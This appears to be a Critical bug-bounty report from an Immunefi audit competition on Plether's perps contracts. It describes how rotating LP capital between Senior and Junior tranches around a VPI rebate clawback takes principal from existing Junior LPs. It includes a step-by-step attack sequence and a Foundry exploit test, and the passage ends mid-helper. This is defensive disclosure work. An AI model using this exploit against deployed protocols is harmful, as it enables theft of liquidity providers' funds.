# \#97734 [SC-Critical] Cross-tranche LP rotation captures a VPI clawback and shifts the later rebate loss to existing Junior LPs

**Submitted on Nov 2nd 2026 at 21:59:37 UTC by @nord0x for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97734
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief / Intro

Plether treats VPI as realized action economics rather than marked price PnL. That separation is valid locally, but the LP ownership system does not preserve ownership across the delayed VPI lifecycle.

When an order heals skew, the pool immediately pays a negative-VPI rebate. The clearinghouse then locks an equal reserve against that trader's negative lifetime VPI. When the healing position closes, the lifetime clamp forces the rebate to be clawed back and the reserve is transferred into HousePool as current claimant revenue.

HousePool prices LP deposits and redemptions from physical pool assets, trader claims, and terminal price PnL. It does not include signed lifetime VPI or any separate action-economics ownership adjustment. Consequently, while Senior is unimpaired, whoever owns Junior when the reserve is returned receives the clawback, even though another open position can later execute a skew-reducing close that pays value back out of the pool.

An attacker can exploit this timing without materially changing pool depth:

1. hold Senior while an unrelated trader creates skew and the attacker opens the healing position;
2. rotate Senior capital into Junior before closing the healing position;
3. close the healing position, causing its dedicated VPI reserve to enter HousePool and be allocated to current Junior owners;
4. rotate back to Senior and redeem completely before the unrelated trader closes;
5. leave the original Junior LP to absorb the later pool outflow.

In the PoC, every attacker top-up is counted as contributed capital. The attacker fully exits both vaults and withdraws its clearinghouse balance before the unrelated trader acts, leaving **166.135710 USDG profit in its wallet**. The existing Junior LP later loses **317.368621 USDG of principal**. The delayed trader close removes exactly **607.413895 USDG** from HousePool and pays the same amount to that trader.

## Vulnerability Details

### 1. LP equity omits the signed VPI lifecycle

[`TerminalNavBookV2.terminalNavSnapshot()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TerminalNavBookV2.sol#L208-L237) commits only terminal price delta, trader claims, directional liability, mark data, and book status:

```solidity
snapshot.hasOpenPositions = totalOpenInterest != 0;
uint256 markPrice = engine.lastMarkPrice();
uint64 markTime = engine.lastMarkTime();
...
if (snapshot.hasOpenPositions) {
    snapshot.terminalLpPriceDeltaAssets = _terminalLpPriceDeltaAssetAtoms(uint32(markPrice));
}
snapshot.markPrice = uint32(markPrice);
snapshot.markTime = markTime;
snapshot.totalTraderClaimsAssets = engine.totalTraderClaimBalanceAssets();
snapshot.maxDirectionalLiabilityAssets = longMaxProfit > shortMaxProfit ? longMaxProfit : shortMaxProfit;
snapshot.bookVersion = _bookVersion;
snapshot.degradedMode = engine.degradedMode();
```

The HousePool input snapshot copies those fields and physical pool assets. It has no signed-VPI or VPI-reserve ownership field: [`CfdEngineProtocolLens.getHousePoolInputSnapshot()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineProtocolLens.sol#L59-L73).

[`HousePoolAccountingLib.buildReconcileSnapshot()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L57-L78) therefore computes LP distributable value from only physical assets, trader claims, and terminal price PnL:

```solidity
uint256 terminalAssets = engineSnapshot.physicalAssets;
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
if (terminalDelta >= 0) {
    terminalAssets += uint256(terminalDelta);
} else {
    terminalLiabilities += uint256(-(terminalDelta + 1)) + 1;
}
...
snapshot.distributable = terminalAssets - terminalLiabilities;
```

This report does **not** claim that VPI should be mixed into the terminal price-PnL curve. The missing invariant is LP ownership: the protocol realizes related VPI cash flows at different times but assigns each realized flow to whoever owns the tranches at that moment.

### 2. A negative-VPI rebate creates a real delayed clawback

The open planner makes a negative trade cost an immediate pool payout and sets the reserve target from the position's signed lifetime VPI: [`CfdEnginePlanLib`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L331-L366).

```solidity
delta.tradeCostAssets = openState.tradeCostAssets;
delta.poolRebatePayoutAssets = openState.tradeCostAssets < 0 ? uint256(-openState.tradeCostAssets) : 0;
...
delta.vpiRebateReserveAfterAssets =
    _negativeVpiReserveTarget(effectiveSnap.position.vpiAccrued + openState.vpiAssets);
```

The production settlement path pays the rebate from HousePool and locks the reserve: [`CfdEngineSettlementSidecar.executeOpen()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L423-L478).

```solidity
if (delta.poolRebatePayoutAssets > 0) {
    IHousePool(host.pool()).payOut(host.clearinghouse(), delta.poolRebatePayoutAssets);
}
...
if (delta.vpiRebateReserveAfterAssets > delta.vpiRebateReserveBeforeAssets) {
    uint256 reserveIncreaseAssets = delta.vpiRebateReserveAfterAssets - delta.vpiRebateReserveBeforeAssets;
    ...
    clearinghouse.lockVpiRebateReserve(delta.account, reserveFromFreeAssets);
}
```

On close, [`CloseAccountingLib.buildCloseState()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118) clamps the closed slice's lifetime VPI so it cannot remain negative:

```solidity
state.proportionalAccrualAssets =
    (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The close planner computes the mandatory clawback and marks the reserve as consumed: [`CfdEnginePlanLib._planCloseActionSettlement()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1035-L1058). Settlement transfers that reserve to HousePool: [`CfdEngineSettlementSidecar._settleCloseActionCharge()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L683-L720), calling [`MarginClearinghouse.consumeVpiRebateReserve()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L883-L907).

```solidity
if (delta.vpiRebateReserveConsumedAssets > 0) {
    clearinghouse.consumeVpiRebateReserve(
        delta.account,
        host.pool(),
        delta.vpiRebateReserveConsumedAssets
    );
}
```

```solidity
vpiRebateReserveBalances[account] -= amountAssets;
reservedSettlementAssets[account] -= amountAssets;
settlementBalances[account] -= amountAssets;
IERC20(settlementAsset).safeTransfer(recipient, amountAssets);
```

So this reserve is not hypothetical collateral. It is real USDG that leaves HousePool on the rebate open and later returns to HousePool on the healer close.

### 3. The returned reserve becomes revenue for the current tranche owners

The planner explicitly includes the consumed VPI reserve in `actionChargeCollectedAssets`: [`CfdEnginePlanLib._planCloseCashSources()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1104-L1133).

```solidity
delta.actionChargeCollectedAssets = delta.vpiRebateReserveConsumedAssets + delta.actionReserveConsumedAssets
    + freeConsumedAssets + delta.actionChargeFromReleasedMarginAssets
    + delta.actionCommittedMarginConsumedAssets;
```

After the reserve transfer, [`executeClose()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L602-L613) includes that amount in `cashArrivedRevenueAssets` and records it as claimant revenue:

```solidity
uint256 protocolFeeCreditedAssets = _settleCloseActionCharge(host, clearinghouse, delta);

uint256 cashArrivedRevenueAssets =
    delta.pricePnlPledgeConsumedAssets + delta.actionChargeCollectedAssets - protocolFeeCreditedAssets;
if (cashArrivedRevenueAssets > 0) {
    IHousePool(host.pool()).recordClaimantInflow(
        cashArrivedRevenueAssets,
        IHousePool.ClaimantInflowKind.Revenue,
        IHousePool.ClaimantInflowCashMode.CashArrived
    );
}
```

[`HousePool.recordClaimantInflow()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L615-L651) increments `accountedAssets`. The next reconcile compares that enlarged distributable value against current Senior and Junior principal: [`HousePoolReconcilePlanLib.planReconcile()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L47-L105). Revenue is then allocated under the current waterfall:

```solidity
HousePoolWaterfallAccountingLib.ReconcilePlan memory waterfallPlan =
    HousePoolWaterfallAccountingLib.planReconcile(
        plan.state.waterfall.seniorPrincipal,
        plan.state.waterfall.juniorPrincipal,
        distributableToClaims
    );

if (waterfallPlan.isRevenue) {
    plan.state.waterfall =
        HousePoolWaterfallAccountingLib.distributeRevenue(plan.state.waterfall, waterfallPlan.deltaAssets);
}
```

[`distributeRevenue()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L133-L159) restores impaired Senior principal and credits all remaining revenue to current Junior principal. Losses are Junior-first at [lines 161-180](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L161-L180).

### 4. LP epochs reconcile and price exits without the outstanding VPI ownership state

[`HousePool._settleLpEpoch()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L824-L919) reconciles first, freezes current Senior/Junior principal as redemption pricing state, funds redemptions, and then prices deposits:

```solidity
_reconcile(accountingSnapshot, statusSnapshot);
_checkpointEngineCarryIndexes();

juniorPhase.pricingPrincipal = juniorPrincipal;
juniorPhase.pricingSupply = _juniorShareSupply();
...
RedemptionPhase memory seniorPhase = RedemptionPhase({
    pricingPrincipal: seniorPrincipal,
    pricingSupply: _seniorShareSupply(),
    ...
});
...
juniorDepositPhase.pricingAssets = juniorPrincipal;
juniorDepositPhase.pricingSupply = _juniorShareSupply();
```

Because the reconcile snapshot has no VPI ownership adjustment, an LP can:

- enter Junior before a reserve clawback is reconciled as revenue;
- exit Junior after capturing it;
- enter or remain in Senior while later pool outflows remain outstanding;
- redeem before those outflows occur.

The one-hour cooldown and epoch process delay the rotations, but they do not bind the VPI lifecycle to one owner cohort. The PoC honors both delays.

## Attack Sequence

The PoC starts with a 990,002-USDG pool: the attacker owns 590,000 USDG of Senior, the victim owns 400,000 USDG of Junior, and the active configuration's 1-USDG seed is present in each tranche. Senior is approximately 59.6% of the pool, below the active 80% limit.

1. An unrelated trader opens a 390,000-unit SHORT, creating skew. The resulting 39.4% skew is below the active 40% maximum.
2. The attacker opens a 390,000-unit LONG, healing the skew. The attacker's lifetime VPI is `-767.584668 USDG`, backed one-for-one by the dedicated reserve. The unrelated trader's lifetime VPI remains `+768.180266 USDG`.
3. The attacker requests redemption of all Senior shares and an equal Junior deposit for the same LP epoch. Every temporary bridge top-up is counted as new attacker capital.
4. The attacker closes the healing LONG. Its reserve is consumed into HousePool and reconciled while the attacker owns Junior.
5. The attacker rotates the resulting Junior position back into Senior, then redeems all Senior shares.
6. Before the unrelated trader closes, the attacker has zero vault shares and zero deferred trader claim, withdraws its entire clearinghouse balance, and holds `1,280,624.893067 USDG` in its wallet against total contributed capital of `1,280,458.757357 USDG`: **166.135710 USDG realized profit**.
7. The unrelated trader then closes. HousePool loses `607.413895 USDG`, and the trader gains exactly `607.413895 USDG`.
8. The existing Junior LP redeems `399,682.631379 USDG` from `400,000 USDG` principal: **317.368621 USDG direct principal loss**.

The rotations do not materially manipulate the VPI denominator. Total pool depth drifts only `5.386631 USDG` during the first rotation and `0.000006 USDG` during the second, against roughly 990,000 USDG of pool capital.

The matched control uses the same positions, prices, initial LP allocation, two async redeem/deposit cycles, LP settlement epochs, bridge-capital accounting, and close ordering, but keeps the attacker entirely in Senior:

- attacker result: **281.850577 USDG loss**;
- existing Junior result: **130.616545 USDG gain**.

The ownership-rotation path swings the attacker's result by `+447.986287 USDG` and the existing Junior LP's result by `-447.985166 USDG`. The control also redeems the attacker before the unrelated trader closes, so same-tranche rollover and early Senior exit do not create the profit. This isolates the exploit from ordinary trading PnL, execution fees, carry, elapsed time, epoch settlement cadence, bridge capital, and exit ordering.

## Impact

This is direct theft of user principal, not unclaimed yield:

- the attacker fully exits LP ownership and withdraws its clearinghouse balance, leaving wallet-held USDG above its aggregate contributed capital, including bridge top-ups;
- the attacker has no LP exposure when the delayed pool outflow occurs;
- the existing Junior LP later redeems less USDG than deposited;
- all positions and requests complete normally, so the loss is not a temporary accounting display;
- no owner, guardian, oracle, or keeper privilege is required.

The demonstrated execution produces `166.135710 USDG` of realized attacker profit above all attacker-contributed capital and causes an existing Junior LP to redeem `317.368621 USDG` below principal. It maps directly to the competition's Critical row: **Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield.**

The attacker does not need control of the skewing trader. The attacker's profit is fully realized and withdrawn while that trader's position remains open; the trader's later ordinary close only realizes the outstanding VPI exposure against the LP cohort left behind.

## Production / Scope

The frozen competition scope includes all production contracts and libraries under `packages/perps/src`, including every root-cause and sink file cited above.

The repository's active Arbitrum Sepolia v2.0.0 [release manifest](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/manifest.json#L9-L14) identifies source commit `1209ca8a5b94a4fb6323c7c4585846ed93db3932`. There is no production-source difference between that release and the competition commit:

```bash
git diff --name-only \
  1209ca8a5b94a4fb6323c7c4585846ed93db3932 \
  a82d4fefb02768e5b3bddcc97dee371eee24fea8 \
  -- packages/perps/src
# no output
```

The active release [economics](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/manifest.json#L165-L194) use the same values as the PoC:

- 1% VPI factor;
- 40% maximum skew ratio;
- 10/20/300-bps maintenance/initial/FAD margins;
- 500-bps base carry;
- 4-bps execution fee;
- 40,000,000-USDG Senior exposure cap;
- 80% maximum Senior share;
- 1-USDG seed deposit in each tranche.

The attack uses the public [`OrderRouter.commitOrder/executeOrder`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L85-L256), public [vault request methods](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L562-L632), public [vault claim methods](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L968-L1021), and public [`OrderRouter.settleLpEpoch`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L479-L500).

The setup performs the same trusted initialization required for deployment, mocks only the USDG token and Pyth delivery, and replaces the repository fixture's deliberately loose Senior test limits with the active `40,000,000 USDG` / `80%` values through HousePool's real delayed propose/finalize path. The fixture deploys `LegacyOrderRouterHarness`, but this PoC calls only inherited production V3 functions; its test-only scalar order adapter is never invoked. The Pyth mock uses two equal-price basket components instead of the active six components and advances one second/block per fresh update. Because every update keeps the basket mark at exactly `1.00 USD`, neither simplification creates the VPI ownership mismatch. Longer `vm.warp` calls honor the production one-hour cooldown, hourly epoch boundaries, and 72-hour Senior-limit delay; no timestamp check is bypassed. The exploit itself uses only public user calls. It does not modify production code, write storage directly, lower resource limits, use a nonstandard token callback, or impersonate a privileged caller.

## Proof of Concept

## Proof of Concept

### Requirements

- Git
- Foundry `1.5.1-stable` (the version pinned by the release manifest)
- Solidity `0.8.35` is selected by the project

From a clean checkout:

```bash
git clone --recursive https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
```

Create `packages/perps/test/perps/differential/AuditVpiCrossTrancheOwnership.t.sol` with the following exact contents:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolAsyncTestBase} from "../shared/HousePoolTestBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";

contract AuditVpiCrossTrancheOwnershipTest is HousePoolAsyncTestBase {

    address private constant ATTACKER = address(0xA771);
    address private constant VICTIM_TRADER = address(0x71C7);
    address private constant VICTIM_LP = address(0xBEEF);

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "active Senior exposure cap must be installed");
        assertEq(pool.maxSeniorShareBps(), 8000, "active Senior share cap must be installed");
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function test_ExploitCrossTrancheRotationCapturesClawbackAndLeavesRebateLoss() public {
        uint256 positionSize = 390_000e18;
        uint256 traderCapital = 100_000e6;
        uint256 attackerSeniorCapital = 590_000e6;
        uint256 victimJuniorCapital = 400_000e6;

        uint256 victimShares = _deposit(juniorVault, VICTIM_LP, victimJuniorCapital);
        uint256 attackerSeniorShares = _deposit(seniorVault, ATTACKER, attackerSeniorCapital);
        _fundTrader(VICTIM_TRADER, traderCapital);
        _fundTrader(ATTACKER, traderCapital);

        // Victim creates short skew; attacker heals it and receives the paired provisional rebate.
        _executeOrder(VICTIM_TRADER, CfdTypes.Side.SHORT, positionSize, 20_000e6, false);
        _executeOrder(ATTACKER, CfdTypes.Side.LONG, positionSize, 20_000e6, false);

        (,,,,,, int256 victimLifetimeVpi) = engine.positions(VICTIM_TRADER);
        (,,,,,, int256 attackerLifetimeVpi) = engine.positions(ATTACKER);
        uint256 attackerRebateReserve = clearinghouse.vpiRebateReserveAssets(ATTACKER);
        assertGt(victimLifetimeVpi, 0, "skewing position must owe positive lifetime VPI");
        assertLt(attackerLifetimeVpi, 0, "healing position must retain negative lifetime VPI");
        assertEq(
            attackerRebateReserve, uint256(-attackerLifetimeVpi), "negative lifetime VPI must be backed one-for-one"
        );

        // Move from Senior to Junior without materially changing pool depth. Junior now owns the clawback.
        uint256 poolDepthBeforeFirstRotation = pool.totalAssets();
        (uint256 attackerJuniorShares, uint256 firstRotationAssets, uint256 firstRotationTopUp) =
            _rotateTranche(ATTACKER, seniorVault, juniorVault, attackerSeniorShares);
        uint256 firstRotationDepthDrift = _absoluteDifference(pool.totalAssets(), poolDepthBeforeFirstRotation);
        assertLe(firstRotationDepthDrift, 10e6, "first rotation changed pool depth beyond carry drift");

        // Closing the healer consumes its reserve into the pool as current LP revenue.
        _executeOrder(ATTACKER, CfdTypes.Side.LONG, positionSize, 0, true);
        assertEq(clearinghouse.vpiRebateReserveAssets(ATTACKER), 0, "close must consume the rebate reserve");
        (,,,,,, int256 victimVpiAfterClawback) = engine.positions(VICTIM_TRADER);
        assertEq(victimVpiAfterClawback, victimLifetimeVpi, "the offsetting positive VPI must remain outstanding");

        // Move back to Senior before the outstanding position realizes its skew-reducing close rebate.
        uint256 poolDepthBeforeSecondRotation = pool.totalAssets();
        (uint256 attackerSeniorSharesAfter, uint256 secondRotationAssets, uint256 secondRotationTopUp) =
            _rotateTranche(ATTACKER, juniorVault, seniorVault, attackerJuniorShares);
        uint256 secondRotationDepthDrift = _absoluteDifference(pool.totalAssets(), poolDepthBeforeSecondRotation);
        assertLe(secondRotationDepthDrift, 10e6, "second rotation changed pool depth beyond carry drift");

        (, uint256 attackerFundedShares, uint256 attackerSeniorRedeemedAssets) =
            _redeem(seniorVault, ATTACKER, attackerSeniorSharesAfter);
        assertEq(attackerFundedShares, attackerSeniorSharesAfter, "attacker redemption must fund fully");
        assertEq(seniorVault.balanceOf(ATTACKER), 0, "attacker must exit Senior completely");
        assertEq(juniorVault.balanceOf(ATTACKER), 0, "attacker must exit Junior completely");
        assertEq(engine.traderClaimBalanceAssets(ATTACKER), 0, "attacker wealth must not depend on a deferred claim");
        uint256 attackerClearinghouseAssets = clearinghouse.balanceAssets(ATTACKER);
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, attackerClearinghouseAssets);
        assertEq(clearinghouse.balanceAssets(ATTACKER), 0, "attacker margin must be fully withdrawable");

        uint256 attackerFinalWealth = settlementToken.balanceOf(ATTACKER);
        uint256 attackerContributedCapital =
            traderCapital + attackerSeniorCapital + firstRotationTopUp + secondRotationTopUp;
        assertGt(attackerFinalWealth, attackerContributedCapital, "attacker must exit with realized profit");

        // The victim trader closes only after the attacker has exited; Junior bears the delayed rebate loss.
        uint256 poolAssetsBeforeDelayedClose = pool.totalAssets();
        uint256 victimTraderWealthBeforeClose = _accountWealth(VICTIM_TRADER);
        _executeOrder(VICTIM_TRADER, CfdTypes.Side.SHORT, positionSize, 0, true);
        uint256 poolAssetsAfterDelayedClose = pool.totalAssets();
        uint256 victimTraderWealthAfterClose = _accountWealth(VICTIM_TRADER);
        assertLt(poolAssetsAfterDelayedClose, poolAssetsBeforeDelayedClose, "delayed close must remove pool assets");
        assertGt(victimTraderWealthAfterClose, victimTraderWealthBeforeClose, "delayed close must pay the trader");
        (, uint256 victimFundedShares, uint256 victimRedeemedAssets) = _redeem(juniorVault, VICTIM_LP, victimShares);
        assertEq(victimFundedShares, victimShares, "victim redemption must fund fully");

        emit log_named_uint("skewing position lifetime VPI", uint256(victimLifetimeVpi));
        emit log_named_uint("healing position rebate reserve", attackerRebateReserve);
        emit log_named_uint("first rotation assets", firstRotationAssets);
        emit log_named_uint("second rotation assets", secondRotationAssets);
        emit log_named_uint("first bridge capital", firstRotationTopUp);
        emit log_named_uint("second bridge top-up", secondRotationTopUp);
        emit log_named_uint("first rotation depth drift", firstRotationDepthDrift);
        emit log_named_uint("second rotation depth drift", secondRotationDepthDrift);
        emit log_named_uint("final senior redemption", attackerSeniorRedeemedAssets);
        emit log_named_uint("attacker final wealth", attackerFinalWealth);
        emit log_named_uint("attacker contributed capital", attackerContributedCapital);
        emit log_named_uint("attacker net profit", attackerFinalWealth - attackerContributedCapital);
        emit log_named_uint("delayed close pool outflow", poolAssetsBeforeDelayedClose - poolAssetsAfterDelayedClose);
        emit log_named_uint("delayed close trader payout", victimTraderWealthAfterClose - victimTraderWealthBeforeClose);
        emit log_named_uint("victim initial capital", victimJuniorCapital);
        emit log_named_uint("victim redemption", victimRedeemedAssets);
        emit log_named_uint("victim principal loss", victimJuniorCapital - victimRedeemedAssets);

        assertLt(victimRedeemedAssets, victimJuniorCapital, "Junior LP must lose principal");
    }

    function test_ControlSameLifecycleWithoutRotationLosesMoney() public {
        uint256 positionSize = 390_000e18;
        uint256 traderCapital = 100_000e6;
        uint256 attackerSeniorCapital = 590_000e6;
        uint256 victimJuniorCapital = 400_000e6;

        uint256 victimShares = _deposit(juniorVault, VICTIM_LP, victimJuniorCapital);
        uint256 attackerSeniorShares = _deposit(seniorVault, ATTACKER, attackerSeniorCapital);
        _fundTrader(VICTIM_TRADER, traderCapital);
        _fundTrader(ATTACKER, traderCapital);

        _executeOrder(VICTIM_TRADER, CfdTypes.Side.SHORT, positionSize, 20_000e6, false);
        _executeOrder(ATTACKER, CfdTypes.Side.LONG, positionSize, 20_000e6, false);

        // Match the exploit's first async cycle but keep all ownership in Senior.
        (uint256 attackerSeniorSharesAfterFirstCycle,, uint256 firstControlTopUp) =
            _rotateTranche(ATTACKER, seniorVault, seniorVault, attackerSeniorShares);
        _executeOrder(ATTACKER, CfdTypes.Side.LONG, positionSize, 0, true);

        // Match the second async cycle, again without crossing tranche ownership.
        (uint256 attackerSeniorSharesAfterSecondCycle,, uint256 secondControlTopUp) =
            _rotateTranche(ATTACKER, seniorVault, seniorVault, attackerSeniorSharesAfterFirstCycle);

        (, uint256 attackerFundedShares, uint256 attackerSeniorRedeemedAssets) =
            _redeem(seniorVault, ATTACKER, attackerSeniorSharesAfterSecondCycle);
        assertEq(attackerFundedShares, attackerSeniorSharesAfterSecondCycle, "control redemption must fund fully");
        assertEq(seniorVault.balanceOf(ATTACKER), 0, "control attacker must exit Senior completely");
        assertEq(juniorVault.balanceOf(ATTACKER), 0, "control attacker must not own Junior");
        assertEq(engine.traderClaimBalanceAssets(ATTACKER), 0, "control wealth must not depend on a deferred claim");
        uint256 attackerClearinghouseAssets = clearinghouse.balanceAssets(ATTACKER);
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, attackerClearinghouseAssets);
        assertEq(clearinghouse.balanceAssets(ATTACKER), 0, "control margin must be fully withdrawable");

        uint256 attackerFinalWealth = settlementToken.balanceOf(ATTACKER);
        uint256 attackerContributedCapital =
            traderCapital + attackerSeniorCapital + firstControlTopUp + secondControlTopUp;
        assertLt(
            attackerFinalWealth,
            attackerContributedCapital,
            "early Senior exit without ownership rotation must still lose"
        );

        // Match the exploit: the unrelated trader acts only after the attacker has fully exited LP ownership.
        _executeOrder(VICTIM_TRADER, CfdTypes.Side.SHORT, positionSize, 0, true);

        (, uint256 victimFundedShares, uint256 victimRedeemedAssets) = _redeem(juniorVault, VICTIM_LP, victimShares);
        assertEq(victimFundedShares, victimShares, "control victim redemption must fund fully");

        emit log_named_uint("control final senior redemption", attackerSeniorRedeemedAssets);
        emit log_named_uint("control first bridge capital", firstControlTopUp);
        emit log_named_uint("control second bridge top-up", secondControlTopUp);
        emit log_named_uint("control attacker final wealth", attackerFinalWealth);
        emit log_named_uint("control attacker contributed capital", attackerContributedCapital);
        emit log_named_uint("control attacker net loss", attackerContributedCapital - attackerFinalWealth);
        emit log_named_uint("control victim initial capital", victimJuniorCapital);
        emit log_named_uint("control victim redemption", victimRedeemedAssets);
        emit log_named_uint("control victim gain", victimRedeemedAssets - victimJuniorCapital);
    }

    function _executeOrder(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) private {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode("vpi-cross-tranche", router.nextCommitId()));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = (side == CfdTypes.Side.LONG) == isClose ? 2e8 : 1;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });

        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory updateData = _mockPythUpdateData(1e8);
        vm.prank(account);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, updateData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "public order must execute");
    }

    function _deposit(
        TrancheVault vault,
        address account,
        uint256 assets
    ) private returns (uint256 shares) {
        settlementToken.mint(account, assets);
        vm.startPrank(account);
        settlementToken.approve(address(vault), assets);
        uint256 requestId = vault.requestDeposit(assets, account, account);
        vm.stopPrank();

        vm.warp(vault.depositEpochStart(requestId));
        bytes[] memory updateData = _mockPythUpdateData(1e8);
        vm.prank(account);
        router.settleLpEpoch(updateData);

        uint256 claimableAssets = vault.claimableDepositRequest(requestId, account);
        vm.prank(account);
        shares = vault.claimDeposit(requestId, claimableAssets, account, account);
    }

    function _redeem(
        TrancheVault vault,
        address account,
        uint256 shares
    ) private returns (uint256 requestId, uint256 fundedShares, uint256 assets) {
        _finishAsyncCooldown(vault, account);
        vm.prank(account);
        requestId = vault.requestRedeem(shares, account, account);

        vm.warp(pool.lpEpochStart(requestId));
        bytes[] memory updateData = _mockPythUpdateData(1e8);
        vm.prank(account);
        router.settleLpEpoch(updateData);

        fundedShares = vault.claimableRedeemRequest(requestId, account);
        vm.prank(account);
        assets = vault.claimRedeem(requestId, fundedShares, account, account);
    }

    function _rotateTranche(
        address account,
        TrancheVault sourceVault,
        TrancheVault destinationVault,
        uint256 shares
    ) private returns (uint256 destinationShares, uint256 redeemedAssets, uint256 topUpAssets) {
